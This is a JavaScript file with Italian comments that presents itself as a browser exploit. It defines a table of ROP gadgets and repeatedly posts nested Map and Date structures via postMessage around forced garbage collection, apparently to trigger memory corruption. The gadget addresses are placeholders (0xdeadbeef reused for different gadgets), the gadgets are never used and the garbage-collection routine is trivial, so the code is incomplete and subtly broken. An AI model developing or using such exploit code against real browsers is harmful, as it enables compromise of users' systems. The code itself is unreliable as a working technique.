// Gadget per la ROP chain
const gadgets = {
    "pop_rdi": 0xdeadbeef,  
    "pop_rsi": 0xcafebabe,  
    "pop_rdx": 0xfeedface,  
    "ret": 0x12345678,      
    "system": 0xdeadbeef,   
    "exit": 0xabcdef12      
};

// Funzione per eseguire Garbage Collection
function gc() {
    try {
        new Uint8Array(256 * 1024);  
        alert('Garbage Collection eseguita');
    } catch (e) {
        alert("Errore durante Garbage Collection: " + e.message);
    }
}

// Funzione per creare una struttura di oggetti in Map
function createObjectStructure(num_elems) {
    let root = new Map();
    let msg = root;
    let foo = [];

    for (let i = 0; i < 5; i++) {
        foo.push(new Date(0xffff));  
    }

    for (let i = 0; i < num_elems; i++) {
        const d = new Date(i);
        const map = new Map();
        msg.set(d, [map, foo]);
        msg = map;
    }

    gc();  
    alert('Struttura di oggetti creata');
    return root;
}

// Funzione principale per l'exploit
export async function main() {
    alert("Inizio exploit");

    const num_elems = 5;  
    let root = createObjectStructure(num_elems);
    let msg = root;
    let idx = null;
    let attempt = 0;

    alert("Oggetto struttura creata");

    let found = false;
    while (!found) {
        attempt += 1;

        alert(`Tentativo numero: ${attempt}`);
        let data = null;

        const prom = new Promise(resolve => {
            addEventListener('message', event => {
                data = event;
                resolve();
            }, { once: true });
        });

        alert("Postando messaggio...");
        postMessage(msg, origin);  
        await prom;  

        if (!data) {
            alert("Errore: Nessun dato ricevuto");
            break;
        }

        data = data.data;

        gc();  

        await new Promise(resolve => setTimeout(resolve, 100));  

        let i;
        try {
            alert("Inizio ricerca dell'indice...");
            for (i = 0; i < num_elems; i++) {
                if (data.keys().next().value.getTime() === 0xffff) {
                    idx = i;
                    found = true;
                    break;
                }
                data = data.values().next().value[0];
            }
        } catch (e) {
            alert("Errore durante l'elaborazione del messaggio: " + e.message);
            break;
        }

        if (!found) {
            alert("Indice non trovato, riprovando...");
        }
    }

    if (found) {
        alert(`Exploit completato con successo, indice trovato: ${idx}`);
    } else {
        alert("Exploit fallito: Indice non trovato.");
    }
}
